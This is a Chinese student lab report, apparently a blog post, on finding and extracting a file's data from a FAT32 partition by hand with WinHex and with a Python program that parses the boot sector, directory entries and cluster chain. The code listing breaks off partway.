        <content type="html"><![CDATA[<h1 id="实验1-磁盘结构与文件系统"><a href="#实验1-磁盘结构与文件系统" class="headerlink" title="实验1 磁盘结构与文件系统"></a>实验1 磁盘结构与文件系统</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li><p>加深对 FAT32 分区及文件系统格式的理解</p></li><li><p>掌握借助 WinHex 等工具手工定位磁盘文件数据的技能</p></li><li><p>通过开发一个磁盘文件数据提取工具，强化编程实践能力。</p></li></ul><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><h3 id="内容一：手工定位和提取-FAT32-分区中的文件数据"><a href="#内容一：手工定位和提取-FAT32-分区中的文件数据" class="headerlink" title="内容一：手工定位和提取 FAT32 分区中的文件数据"></a>内容一：手工定位和提取 FAT32 分区中的文件数据</h3><p>在 FAT32 分区下创建一个不小于 10K 的文件，文件名称用本组组长姓名的拼</p><p>音命名。根据课上介绍的 FAT32 分区及文件系统知识，必要时自行上网查阅</p><p>相关资料，借助 WinHex 或其它十六进制工具，以手工方式从磁盘中逐一找</p><p>到该文件的各个存储扇区，复制其中的有效内容，并拼接组合成一个与原文</p><p>档内容相同的完整文档。</p><p>要求：操作过程描述中，要展示带有组长姓名字样的截图。</p><h3 id="内容二：编程实现“内容一”的全过程"><a href="#内容二：编程实现“内容一”的全过程" class="headerlink" title="内容二：编程实现“内容一”的全过程"></a>内容二：编程实现“内容一”的全过程</h3><p>输入：某个文件（A）的路径</p><p>输出：</p><p>（1）该文件的短文件名目录项信息</p><p>（2）该文件的簇链</p><p>（3）根据上述的文件簇链，从磁盘上提取数据并拼接而得的新文件（B）</p><p>（4）文件 A 与文件 B 内容的比较结果（要求二者完全一致）</p><h2 id="实验工具和编程语言"><a href="#实验工具和编程语言" class="headerlink" title="实验工具和编程语言"></a>实验工具和编程语言</h2><p>实验工具：Winhex、VSCode</p><p>编程语言：Python 3.9.12</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="内容一："><a href="#内容一：" class="headerlink" title="内容一："></a>内容一：</h3><p>提前在新分区的 F 盘上创建 zqb.txt，并填入内容，文件大小 10K。</p><p>打开 Winhex，并且打开 F 磁盘。如下图，可得 BPB 中的重要字段：</p><p>·每扇区字节数：0x0200 </p><p>·每簇扇区数：0x08 </p><p>·保留扇区数：0x100E </p><p>·FAT 的个数：2 </p><p>·每个 FAT 占用的扇区数：0x000007F9 </p><p>·BPB_RootClus（根目录首簇号）：0x02</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020110710251.png"></p><p>故 FirstSectorofRoot=保留扇区数 + (FAT 个数 * 每个 FAT 所占扇区数)</p><p>=0x100E+(2*0x07F9)=0x2000</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020110815637.png"></p><p>定位到 0x2000*0x200=0x400000 根目录处，找到 ZQB.TXT 在 0x4000E0 处。</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020110856194.png"></p><p>参考此表可得</p><p>·起始簇号的高 16 位=0x0001 ·起始簇号的低 16 位=0x022A</p><p>计算得起始簇号=0x0001022A</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020110934931.png"></p><p>定位到 FAT1，即保留扇区数<em>每扇区字节数=0x100E</em>0x0200=0x201c00</p><p>起始簇号=0x0001022A，簇大小 4B，故位于 4*0x0001022A+0x201c00=0x2424A8</p><p>故起始簇的下一簇为 0x0001022B，下一簇=0x0001022C，再下一个为</p><p>0x0FFFFFFF，即最后一簇。</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020111013371.png"></p><p>最后来定位文件，计算文件初始簇的偏移。根据下图的公式可得，</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020111057729.png"></p><p>文件某簇的偏移 = 根目录首簇偏移 + (文件某簇号 - 根目录首簇号)*每簇</p><p>扇区数</p><p>zqb.txt 文件初始簇的偏移</p><p>=0x400000+(0x0001022A-0x2)<em>8</em>0x200=0x10628000</p><p>可以发现，已经定位到 zqb.txt 文件。</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020111130607.png"></p><p>复制其中的有效内容拼接组合成一个与原文档内容相同的完整文档。</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020111203286.png"></p><p>最后可成功打开</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020111233613.png"></p><h3 id="内容二："><a href="#内容二：" class="headerlink" title="内容二："></a>内容二：</h3><h4 id="程序主要设计思路"><a href="#程序主要设计思路" class="headerlink" title="程序主要设计思路"></a>程序主要设计思路</h4><h5 id="路径分割，打开磁盘"><a href="#路径分割，打开磁盘" class="headerlink" title="路径分割，打开磁盘"></a>路径分割，打开磁盘</h5><p>将输入的绝对路径进行分割，分割成一个一个的子文件(不区分文件和目录，</p><p>因为在磁盘中，目录其实就是特殊的文件)。</p><p>例如，对于输入的路径 F:/lab/123/test.txt，会将其分割成[“F:”, “lab”, “123”,“test” ]</p><h5 id="读取磁盘"><a href="#读取磁盘" class="headerlink" title="读取磁盘"></a>读取磁盘</h5><p> BPB 中的数据，主要数据如下</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020111459118.png"></p><h5 id="读取目录项"><a href="#读取目录项" class="headerlink" title="读取目录项"></a>读取目录项</h5><p>读取目录项时，要注意长文件名的单独处理，对于文件名大于 8 字节或者</p><p>文件后缀大于 3 字节的为长文件名。</p><p>首先由公式：FAT32 分区根目录项=保留扇区大小+文件分配表大小*文件分配</p><p>表个数 定位到根目录项。</p><p>然后通过根目录可以读取到一级目录的目录项，然后就可以通过一个循环去</p><p>读取二级、三级等目录项。</p><p>最后找到最后一级目录项，然后定位文件的首簇号，再定位其簇链(实验一</p><p>已经说明)，最后就可以通过簇链定位文件内容。</p><h5 id="读取文件内容并写入新文件"><a href="#读取文件内容并写入新文件" class="headerlink" title="读取文件内容并写入新文件"></a>读取文件内容并写入新文件</h5><p>在第 3 步中，通过起始簇号可以在 FAT 中将文件的整个簇链找出来，然后就可以直接定位文件内容了。</p><p>读取文件内容时，要注意磁盘给文件分配存储空间时，是以簇为单位进行分配的。这也就是说文件的实际大小不一定就为操作系统给其分配的大小，所以这里在最后一簇时，要进行判断。 </p><h5 id="程序使用说明"><a href="#程序使用说明" class="headerlink" title="程序使用说明"></a>程序使用说明</h5><p>考虑到文件路径可能过长，所以只需要将文件路径替换成自己的路径即可，</p><p>注意文件路径应当是绝对路径，并且使用 “\” 进行分割，比如：F:/lab/123/test.txt</p><p>编程语句使用 python，所以无需编译，直接运行即可，如果出现语法错误，</p><p>可以是由于 python 版本导致，笔者使用的是 Python 3.9.12</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020111914045.png"></p><h5 id="程序测试结果"><a href="#程序测试结果" class="headerlink" title="程序测试结果"></a>程序测试结果</h5><p>注意，如果文件目录过深，分析过程可能比较长，请耐心等待</p><p>测试 1：</p><p>输入文件内容及其路径：路径包含 6 级目录，并且包含长文件名及短文件名</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020112526944.png"></p><p>输出结果其新文件内容：</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020112626290.png"></p><p>新旧文件对比：</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020112659991.png"></p><p>测试 2：</p><p>输入文件内容及其路径：文件在根目录下，为短文件</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020112757626.png"></p><p>输出结果：</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020112825361.png"></p><p>新旧文件对比：</p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020112858762.png"></p><p><img src="/2023/10/20/ruan-jian-an-quan-shi-yan-1/image-20231020112920773.png"></p><h4 id="程序代码"><a href="#程序代码" class="headerlink" title="程序代码"></a>程序代码</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token comment"># 打印二进制数据, 方便 debug</span><span class="token keyword">def</span> <span class="token function">binary_dump</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">1000000000000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> i <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n      "</span><span class="token operator">+</span><span class="token string">"-"</span><span class="token operator">*</span><span class="token number">98</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">": "</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">&gt;=</span> length<span class="token punctuation">:</span> <span class="token keyword">break</span>        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> i <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">32</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> i <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">": "</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment"># 字符串转换为 16 进制数据</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token comment"># 将 16 进制按照指定大小端进行转换</span><span class="token keyword">def</span> <span class="token function">hex_to_num</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> endian<span class="token operator">=</span><span class="token string">"little"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    hex_num<span class="token punctuation">,</span> num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">if</span> endian <span class="token operator">==</span> <span class="token string">"big"</span><span class="token punctuation">:</span>        hex_num <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>hex_num<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment">#    print(hex_num)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>hex_num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        num <span class="token operator">|</span><span class="token operator">=</span> hex_num<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> num<span class="token comment"># 读取基本数据</span><span class="token keyword">def</span> <span class="token function">read_BPB</span><span class="token punctuation">(</span>disk<span class="token punctuation">)</span><span class="token punctuation">:</span>    DBR <span class="token operator">=</span> disk<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span>    disk<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#    print(DBR)</span><span class="token comment">#    binary_dump(DBR)</span>    DBR_hex <span class="token operator">=</span> str_to_hex<span class="token punctuation">(</span>DBR<span class="token punctuation">)</span>    byte_per_sector <span class="token operator">=</span> hex_to_num<span class="token punctuation">(</span>DBR_hex<span class="token punctuation">[</span><span class="token number">0xb</span><span class="token punctuation">:</span><span class="token number">0xb</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sector_per_clust <span class="token operator">=</span> hex_to_num<span class="token punctuation">(</span>DBR_hex<span class="token punctuation">[</span><span class="token number">0xd</span><span class="token punctuation">:</span><span class="token number">0xd</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    saved_sector <span class="token operator">=</span> hex_to_num<span class="token punctuation">(</span>DBR_hex<span class="token punctuation">[</span><span class="token number">0xe</span><span class="token punctuation">:</span><span class="token number">0xe</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    fat_nums <span class="token operator">=</span> hex_to_num<span class="token punctuation">(</span>DBR_hex<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">:</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sector_per_fat <span class="token operator">=</span> hex_to_num<span class="token punctuation">(</span>DBR_hex<span class="token punctuation">[</span><span class="token number">0x24</span><span class="token punctuation">:</span><span class="token number">0x24</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    root_clust_idx <span class="token operator">=</span> hex_to_num<span class="token punctuation">(</span>DBR_hex<span class="token punctuation">[</span><span class="token number">0x2c</span><span class="token punctuation">:</span><span class="token number">0x2c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">"""    print("byte_per_sector: ", hex(byte_per_sector))    print("sector_per_clust: ", hex(sector_per_clust))    print("saved_sector: ", hex(saved_sector))    print("fat_nums: ", hex(fat_nums))    print("sector_per_fat: ", hex(sector_per_fat))    print("root_clust_idx: ", hex(root_clust_idx))    """</span>    <span class="token keyword">return</span> byte_per_sector<span class="token punctuation">,</span> sector_per_clust<span class="token punctuation">,</span> saved_sector<span class="token punctuation">,</span> fat_nums<span class="token punctuation">,</span> sector_per_fat<span class="token punctuation">,</span> root_clust_idx<span class="token comment"># 寻找目录项</span><span class="token keyword">def</span> <span class="token function">find_file_dir_entry</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> root_dir_entry_offset<span class="token punctuation">,</span> disk<span class="token punctuation">,</span> suffix<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> max_len <span class="token operator">=</span> <span class="token number">0x10000000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    k <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment"># 短文件名</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">8</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>suffix<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            dentry <span class="token operator">=</span> disk<span class="token punctuation">.</span>read<span class="token punctuation">(</span>root_dir_entry_offset<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">*</span>k<span class="token punctuation">)</span>            disk<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token comment">#    print(dentry[-0x20:])</span>            dentry <span class="token operator">=</span> dentry<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            k <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token comment">#    binary_dump(dentry)</span>        <span class="token comment">#    print("======================================")</span>        <span class="token comment">#    print(str(dentry[:len(filename)]))</span>        <span class="token comment">#    print(str(dentry[8:8+len(suffix)]))</span>        <span class="token comment">#    print(dentry[0])</span>            <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span>dentry<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>                 <span class="token comment">#print("good")</span>                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>suffix<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> <span class="token builtin">str</span><span class="token punctuation">(</span>dentry<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>suffix<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">str</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span>suffix<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment">#    print("good")</span>                    <span class="token keyword">break</span>            <span class="token keyword">if</span> k <span class="token operator">&gt;</span> max_len<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> dentry<span class="token punctuation">,</span> <span class="token boolean">True</span>    <span class="token comment"># 长文件名</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        continue_flag <span class="token operator">=</span> <span class="token boolean">False</span>        idx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span>        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>suffix<span class="token punctuation">)</span>         dentry_num <span class="token operator">=</span> length <span class="token operator">//</span> <span class="token number">13</span> <span class="token operator">+</span> <span class="token number">1</span>        first_num <span class="token operator">=</span> length <span class="token operator">%</span> <span class="token number">13</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>suffix<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span> file_name <span class="token operator">=</span> filename<span class="token operator">+</span><span class="token string">"."</span><span class="token operator">+</span>suffix        <span class="token keyword">else</span><span class="token punctuation">:</span> file_name <span class="token operator">=</span> filename        file_name_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>dentry_num<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            file_name_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>file_name<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">13</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> first_num<span class="token punctuation">:</span> file_name_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>file_name<span class="token punctuation">[</span><span class="token punctuation">(</span>dentry_num<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        file_name_list <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>file_name_list<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment">#print(file_name_list)</span>        <span class="token comment">#print(first_num)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> k <span class="token operator">&gt;</span> max_len<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">False</span>            continue_flag <span class="token operator">=</span> <span class="token boolean">False</span>            dentrys_origin <span class="token operator">=</span> disk<span class="token punctuation">.</span>read<span class="token punctuation">(</span>root_dir_entry_offset<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">*</span><span class="token punctuation">(</span>k<span class="token operator">+</span>dentry_num<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            disk<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            dentrys_origin <span class="token operator">=</span> dentrys_origin<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">*</span><span class="token punctuation">(</span>dentry_num<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>            <span class="token comment">#binary_dump(dentrys_origin)</span>            dentrys <span class="token operator">=</span> <span class="token punctuation">[</span>dentrys_origin<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">:</span>i<span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>dentry_num<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>dentrys<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> dentrys<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> str_to_hex<span class="token punctuation">(</span>dentrys<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token comment">#print(dentry_num)</span>            <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>dentrys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xe5</span><span class="token punctuation">:</span>                k <span class="token operator">+=</span> <span class="token number">1</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> first_num<span class="token punctuation">:</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>first_num<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment">#print(str.upper(file_name_list[0][i]))</span>                    <span class="token comment">#print(str.upper(chr(int(dentrys[0][idx[i]], 16))))</span>                    <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>dentrys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>idx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span>file_name_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        continue_flag <span class="token operator">=</span> <span class="token boolean">True</span>                        <span class="token keyword">break</span>                   <span class="token comment">#else:</span>                        <span class="token comment">#print(str.upper(chr(int(dentrys[0][idx[i]], 16))), end="")</span>                        <span class="token comment">#print("good")</span>            <span class="token keyword">if</span> first_num<span class="token punctuation">:</span> m <span class="token operator">=</span> <span class="token number">1</span>             <span class="token keyword">else</span><span class="token punctuation">:</span> m <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> dentry_num<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token 